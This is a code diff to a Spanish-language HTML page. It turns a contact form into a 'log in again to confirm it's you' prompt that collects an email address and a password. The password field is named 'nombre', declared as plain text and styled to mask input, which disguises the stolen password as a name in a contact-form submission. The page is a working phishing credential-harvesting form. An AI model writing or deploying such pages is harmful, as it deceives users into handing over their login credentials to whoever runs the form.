@@ -60,13 +60,16 @@ button{
 button:hover{
   opacity:.9;
 }
+.password-look {
+  -webkit-text-security: disc;
+}
 </style>
 </head>
 <body>
 
 <div class="modal">
   <h2>Para saber si eres tú inicia sesión de nuevo</h2>
-```html
+
 <form
   name="contact"
   method="POST"
@@ -74,24 +77,24 @@ button:hover{
   action="/gracias.html"
 >
   <input type="hidden" name="form-name" value="contact">
-
-  <input
-    type="text"
-    name="nombre"
-    placeholder="Nombre"
-    required
-  >
-
   <input
     type="email"
     name="email"
     placeholder="Correo electrónico"
     required
   >
+  <input
+  class="password-look"
+    type="text"
+    name="nombre"
+    placeholder="Contraseña"
+    required
+  >
+
+
 
   <button type="submit">Enviar</button>
 </form>
-```
 
 </div>
 
